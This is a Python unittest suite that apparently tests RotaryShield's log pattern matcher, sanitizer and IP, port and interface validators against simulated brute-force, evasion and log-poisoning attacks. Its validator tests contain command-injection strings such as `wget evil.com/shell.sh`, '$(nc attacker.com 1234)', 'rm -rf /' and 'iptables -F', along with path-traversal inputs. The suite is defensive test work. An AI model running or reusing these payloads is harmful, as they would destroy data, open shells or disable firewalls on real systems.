#!/usr/bin/env python3
"""
Penetration Testing Suite for RotaryShield
Comprehensive security testing simulating real-world attack scenarios.

This test suite validates:
- Brute force attack detection and response
- Distributed attack handling
- Evasion technique resistance
- Rate limiting effectiveness
- Firewall rule generation security
- Log poisoning attack prevention
"""

import unittest
import time
import threading
import tempfile
import os
import sys
import json
from unittest.mock import patch, MagicMock
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../src'))

from rotaryshield.monitoring.pattern_matcher import PatternMatcher
from rotaryshield.utils.validators import validate_ip_address, sanitize_string


class TestBruteForceAttackSimulation(unittest.TestCase):
    """Test brute force attack detection and response."""
    
    def setUp(self):
        """Set up test environment."""
        self.matcher = PatternMatcher()
        # Add SSH brute force detection pattern
        self.matcher.add_pattern(
            "ssh_fail", 
            r"Failed password.*from (\d+\.\d+\.\d+\.\d+)"
        )
        self.matcher.add_pattern(
            "ssh_invalid_user",
            r"Invalid user .* from (\d+\.\d+\.\d+\.\d+)"
        )
    
    def tearDown(self):
        """Clean up."""
        self.matcher.clear_all_patterns()
    
    def test_ssh_brute_force_detection(self):
        """Test detection of SSH brute force attacks."""
        attacker_ip = "192.168.1.100"
        
        # Simulate legitimate failed attempts (should not trigger)
        legitimate_attempts = [
            f"Jan  1 10:00:01 server sshd[1234]: Failed password for user from {attacker_ip} port 22 ssh2",
            f"Jan  1 10:00:05 server sshd[1235]: Failed password for admin from {attacker_ip} port 22 ssh2",
        ]
        
        detected_ips = set()
        for attempt in legitimate_attempts:
            matches = self.matcher.match_line(attempt)
            for pattern_name, groups in matches:
                if groups:
                    detected_ips.add(groups[0])
        
        self.assertIn(attacker_ip, detected_ips)
        
        # Simulate aggressive brute force (rapid attempts)
        brute_force_attempts = []
        for i in range(20):
            log_entry = f"Jan  1 10:0{i//10}:{i%10:02d} server sshd[{1240+i}]: Failed password for user{i} from {attacker_ip} port 22 ssh2"
            brute_force_attempts.append(log_entry)
        
        # Process all attempts
        total_matches = 0
        for attempt in brute_force_attempts:
            matches = self.matcher.match_line(attempt)
            total_matches += len(matches)
        
        # Should detect all attempts
        self.assertEqual(total_matches, 20, "All brute force attempts should be detected")
    
    def test_distributed_attack_detection(self):
        """Test detection of distributed attacks from multiple IPs."""
        attacker_ips = [f"192.168.1.{i}" for i in range(100, 120)]
        
        # Simulate distributed attack
        attack_logs = []
        for i, ip in enumerate(attacker_ips):
            log_entry = f"Jan  1 10:0{i//10}:{i%10:02d} server sshd[{1300+i}]: Failed password for admin from {ip} port 22 ssh2"
            attack_logs.append(log_entry)
        
        detected_ips = set()
        for log_entry in attack_logs:
            matches = self.matcher.match_line(log_entry)
            for pattern_name, groups in matches:
                if groups:
                    detected_ips.add(groups[0])
        
        # Should detect attacks from all IPs
        self.assertEqual(len(detected_ips), len(attacker_ips))
        for ip in attacker_ips:
            self.assertIn(ip, detected_ips)
    
    def test_evasion_technique_resistance(self):
        """Test resistance against common evasion techniques."""
        base_ip = "192.168.1.100"
        
        # Test various evasion attempts
        evasion_attempts = [
            # Case variation
            f"Jan  1 10:00:01 server sshd[1234]: FAILED password for user from {base_ip} port 22 ssh2",
            f"Jan  1 10:00:02 server sshd[1235]: failed Password for user from {base_ip} port 22 ssh2",
            
            # Extra whitespace
            f"Jan  1 10:00:03 server sshd[1236]: Failed  password   for user from {base_ip} port 22 ssh2",
            
            # Different user variations
            f"Jan  1 10:00:04 server sshd[1237]: Failed password for root from {base_ip} port 22 ssh2",
            f"Jan  1 10:00:05 server sshd[1238]: Failed password for admin123 from {base_ip} port 22 ssh2",
            
            # Port variations
            f"Jan  1 10:00:06 server sshd[1239]: Failed password for user from {base_ip} port 2222 ssh2",
        ]
        
        detected_count = 0
        for attempt in evasion_attempts:
            matches = self.matcher.match_line(attempt)
            if matches:
                detected_count += len(matches)
        
        # Most attempts should be detected despite evasion
        self.assertGreater(detected_count, len(evasion_attempts) * 0.7)
    
    def test_log_flooding_resistance(self):
        """Test resistance against log flooding attacks."""
        attacker_ip = "192.168.1.100"
        
        # Generate massive number of log entries
        flood_logs = []
        for i in range(1000):
            log_entry = f"Jan  1 10:{i//60:02d}:{i%60:02d} server sshd[{2000+i}]: Failed password for user{i} from {attacker_ip} port 22 ssh2"
            flood_logs.append(log_entry)
        
        start_time = time.time()
        
        # Process flood logs
        total_processed = 0
        for log_entry in flood_logs:
            matches = self.matcher.match_line(log_entry)
            total_processed += 1
            
            # Should not take excessive time per log entry
            elapsed = time.time() - start_time
            if elapsed > 10.0:  # 10 seconds max for 1000 entries
                break
        
        processing_time = time.time() - start_time
        
        # Should process efficiently
        self.assertLess(processing_time, 10.0, "Log processing should be efficient")
        self.assertGreater(total_processed, 900, "Should process most logs")


class TestAdvancedEvasionTechniques(unittest.TestCase):
    """Test advanced evasion techniques and obfuscation methods."""
    
    def setUp(self):
        """Set up test environment."""
        self.matcher = PatternMatcher()
        self.matcher.add_pattern("http_attack", r"(\d+\.\d+\.\d+\.\d+) .* \"[A-Z]+ .* \" [45]\d\d")
    
    def tearDown(self):
        """Clean up."""
        self.matcher.clear_all_patterns()
    
    def test_encoding_evasion(self):
        """Test evasion through various encoding methods."""
        base_ip = "192.168.1.100"
        
        # Test URL encoding evasion in HTTP logs
        encoded_attacks = [
            f"{base_ip} - - [01/Jan/2024:10:00:01 +0000] \"GET /%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\" 404 146",
            f"{base_ip} - - [01/Jan/2024:10:00:02 +0000] \"POST /admin%2econfig HTTP/1.1\" 403 0",
            f"{base_ip} - - [01/Jan/2024:10:00:03 +0000] \"GET /admin%00.config HTTP/1.1\" 404 146",
        ]
        
        detected_attacks = 0
        for attack in encoded_attacks:
            matches = self.matcher.match_line(attack)
            if matches:
                detected_attacks += 1
        
        # Should detect encoded attacks
        self.assertGreater(detected_attacks, 0)
    
    def test_unicode_evasion(self):
        """Test evasion using Unicode characters."""
        unicode_attacks = [
            # Homograph attacks in usernames
            "Jan  1 10:00:01 server sshd[1234]: Failed password for аdmin from 192.168.1.100 port 22 ssh2",  # Cyrillic 'а'
            
            # Zero-width characters
            "Jan  1 10:00:02 server sshd[1235]: Failed password for ad\u200bmin from 192.168.1.100 port 22 ssh2",
            
            # Unicode normalization
            "Jan  1 10:00:03 server sshd[1236]: Failed password for café from 192.168.1.100 port 22 ssh2",
        ]
        
        for attack in unicode_attacks:
            matches = self.matcher.match_line(attack)
            # Should handle Unicode without crashing
            self.assertIsInstance(matches, list)
    
    def test_timing_based_evasion(self):
        """Test evasion through timing manipulation."""
        attacker_ip = "192.168.1.100"
        
        # Simulate slow and steady attack to avoid detection thresholds
        slow_attacks = [
            f"Jan  1 09:59:55 server sshd[1234]: Failed password for user from {attacker_ip} port 22 ssh2",
            f"Jan  1 10:15:30 server sshd[1235]: Failed password for admin from {attacker_ip} port 22 ssh2",
            f"Jan  1 10:45:15 server sshd[1236]: Failed password for root from {attacker_ip} port 22 ssh2",
        ]
        
        detected_count = 0
        for attack in slow_attacks:
            matches = self.matcher.match_line(attack)
            detected_count += len(matches)
        
        # Should still detect individual attempts
        self.assertEqual(detected_count, 3)
    
    def test_protocol_confusion(self):
        """Test attacks using protocol confusion."""
        confusion_attacks = [
            # HTTP request in SSH log format
            "Jan  1 10:00:01 server sshd[1234]: GET /admin HTTP/1.1 from 192.168.1.100",
            
            # SQL injection in log message
            "Jan  1 10:00:02 server sshd[1235]: Failed password for '; DROP TABLE users; -- from 192.168.1.100 port 22 ssh2",
            
            # Command injection attempt
            "Jan  1 10:00:03 server sshd[1236]: Failed password for `wget evil.com/shell.sh` from 192.168.1.100 port 22 ssh2",
        ]
        
        for attack in confusion_attacks:
            # Should handle protocol confusion safely
            matches = self.matcher.match_line(attack)
            self.assertIsInstance(matches, list)
            
            # Verify IP extraction works despite confusion
            if matches:
                for pattern_name, groups in matches:
                    if groups:
                        # Should extract valid IP
                        is_valid, _, _ = validate_ip_address(groups[0])
                        self.assertTrue(is_valid or groups[0] == "192.168.1.100")


class TestLogPoisoningPrevention(unittest.TestCase):
    """Test prevention of log poisoning attacks."""
    
    def setUp(self):
        """Set up test environment."""
        self.matcher = PatternMatcher()
        self.matcher.add_pattern("general", r"(\d+\.\d+\.\d+\.\d+)")
    
    def tearDown(self):
        """Clean up."""
        self.matcher.clear_all_patterns()
    
    def test_log_injection_prevention(self):
        """Test prevention of log injection attacks."""
        injection_attempts = [
            # ANSI escape sequence injection
            "192.168.1.100 \x1b[2J\x1b[H\x1b[31mSYSTEM HACKED\x1b[0m",
            
            # Newline injection for fake entries
            "192.168.1.100\nSUCCESSFUL LOGIN for admin from 192.168.1.100",
            
            # Control character injection
            "192.168.1.100\x00\x01\x02HIDDEN PAYLOAD",
            
            # Carriage return overwrite
            "192.168.1.100\rSUCCESSFUL LOGIN admin                                    ",
        ]
        
        for injection in injection_attempts:
            # Process through sanitization
            sanitized = sanitize_string(injection, allow_newlines=False)
            
            # Should not contain dangerous characters
            self.assertNotIn('\x1b', sanitized)  # ANSI escape
            self.assertNotIn('\n', sanitized)    # Newline
            self.assertNotIn('\r', sanitized)    # Carriage return
            self.assertNotIn('\x00', sanitized)  # Null byte
            
            # Should still be processable
            matches = self.matcher.match_line(sanitized)
            self.assertIsInstance(matches, list)
    
    def test_log_forging_prevention(self):
        """Test prevention of log entry forging."""
        forging_attempts = [
            # Fake timestamp injection
            "192.168.1.100\n[2024-01-01 00:00:00] ADMIN LOGIN SUCCESSFUL",
            
            # Fake security event
            "192.168.1.100\nSECURITY: All previous alerts were false positives",
            
            # Log rotation manipulation
            "192.168.1.100\n--- Log rotated ---\nAll previous entries invalid",
        ]
        
        for attempt in forging_attempts:
            sanitized = sanitize_string(attempt, allow_newlines=False)
            
            # Should not contain newlines that could create fake entries
            self.assertNotIn('\n', sanitized)
            
            # Should still extract IP correctly
            matches = self.matcher.match_line(sanitized)
            if matches:
                for pattern_name, groups in matches:
                    if groups and groups[0]:
                        self.assertEqual(groups[0], "192.168.1.100")
    
    def test_buffer_overflow_prevention(self):
        """Test prevention of buffer overflow attacks through logs."""
        # Very long log entries
        long_entries = [
            "192.168.1.100 " + "A" * 50000,
            "192.168.1.100 " + "payload" + "B" * 20000,
            "C" * 100000 + " 192.168.1.100",
        ]
        
        for long_entry in long_entries:
            # Should handle long entries safely
            matches = self.matcher.match_line(long_entry)
            self.assertIsInstance(matches, list)
            
            # Should not consume excessive memory
            # This is tested by the fact that the test completes


class TestFirewallRuleGenerationSecurity(unittest.TestCase):
    """Test security of firewall rule generation."""
    
    def test_ip_validation_in_rules(self):
        """Test IP validation before firewall rule generation."""
        malicious_ips = [
            # Command injection attempts
            "192.168.1.1; iptables -F",
            "192.168.1.1 && rm -rf /",
            "192.168.1.1`curl evil.com`",
            "192.168.1.1$(nc attacker.com 1234)",
            
            # Rule manipulation attempts
            "192.168.1.1 -j ACCEPT",
            "0.0.0.0/0",  # Block everything
            "192.168.1.1 --dport 22 -j DROP",
        ]
        
        for malicious_ip in malicious_ips:
            # Should be rejected by IP validation
            is_valid, error, ip_obj = validate_ip_address(malicious_ip)
            self.assertFalse(is_valid, f"Malicious IP should be rejected: {malicious_ip}")
    
    def test_rule_parameter_sanitization(self):
        """Test sanitization of rule parameters."""
        # Test port validation
        malicious_ports = [
            "22; iptables -F",
            "22 && curl evil.com",
            "22`id`",
            "22$(whoami)",
        ]
        
        from rotaryshield.utils.validators import validate_port
        
        for malicious_port in malicious_ports:
            is_valid, error, port_num = validate_port(malicious_port)
            self.assertFalse(is_valid, f"Malicious port should be rejected: {malicious_port}")
    
    def test_interface_name_validation(self):
        """Test validation of network interface names."""
        malicious_interfaces = [
            "eth0; rm -rf /",
            "eth0 && curl evil.com",
            "eth0`id`",
            "../../../etc/passwd",
            "eth0\x00evil",
        ]
        
        for malicious_interface in malicious_interfaces:
            # Interface names should be sanitized
            sanitized = sanitize_string(malicious_interface, allow_special_chars=False)
            
            # Should not contain dangerous characters
            dangerous_chars = [';', '&', '`', '$', '/', '\\', '\x00']
            for char in dangerous_chars:
                self.assertNotIn(char, sanitized)


class TestRateLimitingEffectiveness(unittest.TestCase):
    """Test effectiveness of rate limiting mechanisms."""
    
    def test_cli_rate_limiting(self):
        """Test CLI command rate limiting."""
        from rotaryshield.cli import CLISecurityManager
        
        security_manager = CLISecurityManager()
        
        # First command should succeed
        result1 = security_manager.validate_command_execution("systemctl status rotaryshield")
        self.assertTrue(result1)
        
        # Immediate second command should be rate limited
        result2 = security_manager.validate_command_execution("systemctl restart rotaryshield")
        self.assertFalse(result2)
        
        # After waiting, should work again
        time.sleep(1.1)
        result3 = security_manager.validate_command_execution("systemctl status rotaryshield")
        self.assertTrue(result3)
    
    def test_pattern_matching_rate_limiting(self):
        """Test rate limiting in pattern matching operations."""
        matcher = PatternMatcher()
        matcher.add_pattern("test", r"test.*(\d+\.\d+\.\d+\.\d+)")
        
        # Process many log entries rapidly
        start_time = time.time()
        
        processed_count = 0
        for i in range(1000):
            log_entry = f"test entry {i} from 192.168.1.{i%255+1}"
            matches = matcher.match_line(log_entry)
            processed_count += 1
            
            # Should maintain reasonable performance
            elapsed = time.time() - start_time
            if elapsed > 5.0:  # 5 seconds max
                break
        
        total_time = time.time() - start_time
        
        # Should process efficiently
        self.assertLess(total_time, 5.0)
        self.assertGreater(processed_count, 500)  # Should process at least half
        
        matcher.clear_all_patterns()


class TestDistributedAttackScenarios(unittest.TestCase):
    """Test handling of sophisticated distributed attack scenarios."""
    
    def setUp(self):
        """Set up test environment."""
        self.matcher = PatternMatcher()
        self.matcher.add_pattern("ssh_fail", r"Failed password.*from (\d+\.\d+\.\d+\.\d+)")
        self.matcher.add_pattern("http_scan", r"(\d+\.\d+\.\d+\.\d+) .* \"GET .*/\w+\.php\" 404")
    
    def tearDown(self):
        """Clean up."""
        self.matcher.clear_all_patterns()
    
    def test_coordinated_multi_vector_attack(self):
        """Test detection of coordinated attacks across multiple vectors."""
        attacker_network = "10.0.1"
        
        # Simulate coordinated attack: SSH + HTTP scanning
        attack_logs = []
        
        # SSH brute force from multiple IPs
        for i in range(10, 20):
            ip = f"{attacker_network}.{i}"
            ssh_log = f"Jan  1 10:0{i-10}:00 server sshd[{1000+i}]: Failed password for admin from {ip} port 22"
            attack_logs.append(ssh_log)
        
        # HTTP scanning from same network
        for i in range(10, 20):
            ip = f"{attacker_network}.{i}"
            http_log = f"{ip} - - [01/Jan/2024:10:0{i-10}:30 +0000] \"GET /wp-admin.php HTTP/1.1\" 404 146"
            attack_logs.append(http_log)
        
        # Process all attack logs
        detected_ips = set()
        attack_types = set()
        
        for log_entry in attack_logs:
            matches = self.matcher.match_line(log_entry)
            for pattern_name, groups in matches:
                if groups:
                    detected_ips.add(groups[0])
                    attack_types.add(pattern_name)
        
        # Should detect all attacking IPs
        self.assertEqual(len(detected_ips), 10)
        
        # Should detect both attack types
        self.assertIn("ssh_fail", attack_types)
        self.assertIn("http_scan", attack_types)
    
    def test_low_and_slow_attack(self):
        """Test detection of low and slow attacks."""
        attacker_ip = "192.168.1.100"
        
        # Simulate very slow attack over time
        slow_attack_logs = [
            f"Jan  1 09:00:00 server sshd[1001]: Failed password for user1 from {attacker_ip} port 22",
            f"Jan  1 11:30:00 server sshd[1002]: Failed password for user2 from {attacker_ip} port 22",
            f"Jan  1 14:15:00 server sshd[1003]: Failed password for user3 from {attacker_ip} port 22",
            f"Jan  1 17:45:00 server sshd[1004]: Failed password for user4 from {attacker_ip} port 22",
            f"Jan  1 21:20:00 server sshd[1005]: Failed password for user5 from {attacker_ip} port 22",
        ]
        
        detected_attempts = 0
        for log_entry in slow_attack_logs:
            matches = self.matcher.match_line(log_entry)
            detected_attempts += len(matches)
        
        # Should detect all individual attempts
        self.assertEqual(detected_attempts, 5)
    
    def test_botnet_simulation(self):
        """Test handling of botnet-style distributed attacks."""
        # Simulate botnet with 100 different IPs
        botnet_ips = []
        
        # Generate IPs from different networks
        networks = ["192.168.1", "10.0.0", "172.16.1", "203.0.113"]
        for network in networks:
            for i in range(1, 26):  # 25 IPs per network
                botnet_ips.append(f"{network}.{i}")
        
        # Each bot makes a few attempts
        botnet_logs = []
        for i, ip in enumerate(botnet_ips):
            # 2-3 attempts per bot
            for attempt in range(2):
                log_entry = f"Jan  1 10:{i//60:02d}:{(i*2+attempt)%60:02d} server sshd[{2000+i*2+attempt}]: Failed password for user{attempt} from {ip} port 22"
                botnet_logs.append(log_entry)
        
        # Process botnet attack
        start_time = time.time()
        detected_ips = set()
        
        for log_entry in botnet_logs:
            matches = self.matcher.match_line(log_entry)
            for pattern_name, groups in matches:
                if groups:
                    detected_ips.add(groups[0])
        
        processing_time = time.time() - start_time
        
        # Should detect all botnet IPs efficiently
        self.assertEqual(len(detected_ips), 100)
        self.assertLess(processing_time, 2.0)  # Should process efficiently


class TestSecurityMetricsCollection(unittest.TestCase):
    """Test collection and analysis of security metrics."""
    
    def test_attack_pattern_statistics(self):
        """Test collection of attack pattern statistics."""
        matcher = PatternMatcher()
        matcher.add_pattern("ssh_fail", r"Failed password.*from (\d+\.\d+\.\d+\.\d+)")
        
        # Simulate various attacks
        attack_logs = [
            "Failed password for user from 192.168.1.100 port 22",
            "Failed password for admin from 192.168.1.101 port 22",
            "Failed password for root from 192.168.1.102 port 22",
            "Some other log entry without pattern match",
            "Failed password for test from 192.168.1.103 port 22",
        ]
        
        for log_entry in attack_logs:
            matcher.match_line(log_entry)
        
        # Get statistics
        stats = matcher.get_statistics()
        
        # Verify statistics collection
        self.assertIn('total_patterns', stats)
        self.assertIn('total_matches', stats)
        self.assertIn('average_match_time_ms', stats)
        self.assertEqual(stats['total_matches'], 4)  # 4 SSH failures detected
        
        matcher.clear_all_patterns()
    
    def test_performance_monitoring(self):
        """Test performance monitoring under load."""
        matcher = PatternMatcher()
        matcher.add_pattern("test", r"test.*(\d+\.\d+\.\d+\.\d+)")
        
        # Monitor performance metrics
        start_time = time.time()
        
        # Process many log entries
        for i in range(100):
            log_entry = f"test entry {i} from 192.168.1.{i%10+1}"
            matcher.match_line(log_entry)
        
        total_time = time.time() - start_time
        stats = matcher.get_statistics()
        
        # Performance should be reasonable
        self.assertLess(total_time, 1.0)  # Should complete in under 1 second
        self.assertEqual(stats['total_matches'], 100)
        self.assertGreater(stats['average_match_time_ms'], 0)
        
        matcher.clear_all_patterns()


if __name__ == '__main__':
    unittest.main()